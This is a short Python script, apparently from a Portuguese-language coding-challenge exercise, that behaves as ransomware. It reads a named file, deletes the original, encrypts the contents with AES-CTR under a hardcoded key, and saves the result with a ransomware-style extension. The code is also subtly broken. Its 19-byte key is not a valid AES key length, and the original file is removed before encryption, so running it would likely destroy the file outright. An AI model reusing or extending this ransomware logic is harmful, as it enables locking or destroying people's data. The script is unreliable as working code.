import os
import pyaes

def encrypt_file(file_name, key):
    try:
        # Abrir o arquivo a ser criptografado
        with open(file_name, "rb") as file:
            file_data = file.read()

        # Remover o arquivo original
        os.remove(file_name)

        # Chave de criptografia
        aes = pyaes.AESModeOfOperationCTR(key)

        # Criptografar o arquivo
        crypto_data = aes.encrypt(file_data)

        # Salvar o arquivo criptografado
        encrypted_file_name = file_name + ".ransowaredesafiodecodigo"
        with open(encrypted_file_name, "wb") as new_file:
            new_file.write(crypto_data)

        print(f"Arquivo '{file_name}' criptografado com sucesso como '{encrypted_file_name}'.")

    except Exception as e:
        print(f"Erro ao criptografar o arquivo: {e}")

if __name__ == "__main__":
    file_name = "desafiodio.txt"
    key = b"ransowarediodesafio"
    encrypt_file(file_name, key)